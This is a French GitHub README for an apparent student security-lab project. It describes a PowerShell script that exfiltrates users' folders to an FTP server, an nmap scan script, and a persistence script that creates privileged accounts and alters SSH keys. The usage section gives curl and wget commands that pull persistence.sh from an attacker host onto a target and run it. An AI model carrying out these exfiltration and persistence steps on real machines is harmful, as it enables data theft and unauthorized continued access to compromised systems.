# Soc-project

Ce script permet d’extraire les données utilisateurs d’une machine. 
Il va détecter les différents dossiers utilisateurs et créer une archive qui sera ensuite déposée sur un serveur 
FTP. 
Ce script permet en cas de compromission d’une machine de récupérer les dossiers des utilisateurs, identifie des chemins spécifiques, les compresse dans un fichier d'archive, puis pousse le fichier vers un serveur FTP.

## Prérequis script 1 - Exfiltration de données

Le module PSFTP n'est pas un module PowerShell standard il faut cependant l'installer.
Pour installer ce module exécutez la commande :  Install-Module PSFTP

Une fois le module installé, vous pouvez utiliser la cmdlet Import-Module pour l'importer dans votre script : Import-Module PSFTP

Après avoir installé et importé le module, vous pouvez continuer à exécuter le reste de votre script, qui comprend la récupération des dossiers des utilisateurs, la compression de chemins spécifiques dans un fichier d'archive et la poussée du fichier vers un serveur FTP.

Un autre prerequis est nécessaire dans notre cas.

Installer FILEZILLA 
Dans un cas reél le serveur FTP serait en ligne mais comme nous sommes en local, FileZilla nous servira d'un serveur FTP.


![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capturefile.PNG)

![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capture1.PNG)

Deux fichier vont se créer : TEMP ET PULL

![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/MicrosoftTeams-image%20(1).png)

Dans le dossier TEMP, on aura toute l'extraction de la machine.
Dans le dossier PULL, aura toute l'extraction du serveur FTP (cas reel sa sera sur internet et pas en local)

![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/MicrosoftTeams-image%20(2).png)

Ici, vous voyez bien que tout mon bureau a été transferer sur le serveur FTP.

Cependant, je vous ai montrer un exemple avec l'extraction d'un bureau ou des document.
Vous pouvez également mettre le chemin d'une clé USB/disque.


## Script 2 - Scan nmap

 Les scripts Nmap fournissent une fonctionnalité supplémentaire et permettent d'automatiser certaines tâches de découverte de réseau, d'analyse de sécurité et de collecte d'informations.
 
 Usage : Lancer le script sur une machine Kali : https://github.com/NoorXmnr/Soc-project/blob/main/scan.sh
 
 ![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capture%20nmap.PNG)
 
 ![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capture%20nmap%20dossier%20implicaction.PNG)
 
 
 
 ## Script 3 - Persistance
 
 Ce script permet de maintenir l'accés au systéme compromis, méme si le système est redémarré ou si les informations d'identification sont modifiées.
 Ce script inclut également la création de nouveaux comptes ou la sécurisation de l'accès via SSH.
 
 # Fonctionalités
 - Créer un utilisateur local
 - Privilèges élevés
 - Modifier les clés SSH
 
 # Utilisation 
 
 Depuis Github : https://github.com/NoorXmnr/Soc-project/blob/main/Cr%C3%A9ation%20d'utilisateurs%20avec%20privil%C3%A9ges.sh
 
 Depuis le réseau local : 
 #Host:
sh persistence.sh -w
#Target:
curl -LJO <Host>:8000/persistence.sh #or
curl <Host>:8000/persistence.sh > persistence.sh #or
wget <Host>:8000/persistence.sh
sh persistence.sh -h
 
 
